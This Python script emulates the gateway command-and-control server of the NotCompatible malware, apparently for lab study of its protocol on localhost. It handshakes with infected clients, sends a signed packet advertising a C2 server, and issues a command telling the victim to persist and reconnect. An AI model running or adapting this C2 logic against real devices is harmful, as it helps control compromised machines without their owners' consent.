from __future__ import annotations

import argparse
import logging
import socket
import threading
import time
from pathlib import Path

from shared.configuration import build_signed_set
from shared.crypto import load_key
from shared.protocol import raw
from shared.session import SessionClosed, server_handshake


LOG = logging.getLogger("gateway")


def handle_client(
    client: socket.socket,
    address,
    args,
    global_private,
    stop: threading.Event,
) -> None:
    peer = f"{address[0]}:{address[1]}"
    session = None
    try:
        LOG.info("%s connected", peer)
        session, _ = server_handshake(client, peer)
        LOG.info("%s RSA/RC4 handshake complete", peer)

        hello = session.wait_for(lambda packet: packet.tag == "HELO", timeout=10)
        LOG.info("%s -> HELO\n%s", peer, hello.pretty(1))

        set_packet = build_signed_set(
            global_private,
            args.advertise_host,
            args.listen_port,
            args.c2_host,
            args.c2_port,
            args.lid,
        )
        session.send_packet(set_packet)
        LOG.info("GW -> %s SET signed with laboratory RSAGlobal", peer)

        time.sleep(args.command_delay)
        session.send_packet(raw("SETGROUP", (1).to_bytes(2, "little")))
        LOG.info("GW -> %s SETGROUP=1; victim should persist and reconnect", peer)

        while not stop.is_set():
            try:
                packets = session.receive_available(0.5)
                for packet in packets:
                    LOG.info("%s -> %s", peer, packet.tag)
            except SessionClosed:
                LOG.info("%s closed the gateway session as expected", peer)
                break
    except (OSError, ValueError, TimeoutError, SessionClosed) as exc:
        LOG.warning("%s session ended: %s", peer, exc)
    finally:
        if session is not None:
            session.close()
        else:
            client.close()


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    parser = argparse.ArgumentParser(description="NotCompatible Gateway C2 emulator")
    parser.add_argument("--listen-host", default="127.0.0.1")
    parser.add_argument("--listen-port", type=int, default=18443)
    parser.add_argument(
        "--advertise-host",
        default="127.0.0.1",
        help="Gateway IPv4 address placed in SET",
    )
    parser.add_argument("--c2-host", default="127.0.0.1")
    parser.add_argument("--c2-port", type=int, default=19443)
    parser.add_argument("--lid", type=int, default=2)
    parser.add_argument("--command-delay", type=float, default=0.15)
    parser.add_argument(
        "--global-private",
        default=str(root / "keys" / "global_private.pem"),
    )
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [GW] %(message)s",
        datefmt="%H:%M:%S",
    )
    global_private = load_key(args.global_private)
    if not global_private.has_private():
        raise SystemExit("--global-private must contain an RSA private key")

    stop = threading.Event()
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((args.listen_host, args.listen_port))
    listener.listen()
    listener.settimeout(0.5)
    LOG.info("Listening on %s:%d (Ctrl+C to stop)", args.listen_host, args.listen_port)
    LOG.info("Advertising Operational C2 %s:%d", args.c2_host, args.c2_port)

    try:
        while not stop.is_set():
            try:
                client, address = listener.accept()
            except socket.timeout:
                continue
            threading.Thread(
                target=handle_client,
                args=(client, address, args, global_private, stop),
                daemon=True,
            ).start()
    except KeyboardInterrupt:
        LOG.info("Ctrl+C received, shutting down")
    finally:
        stop.set()
        listener.close()


if __name__ == "__main__":
    main()
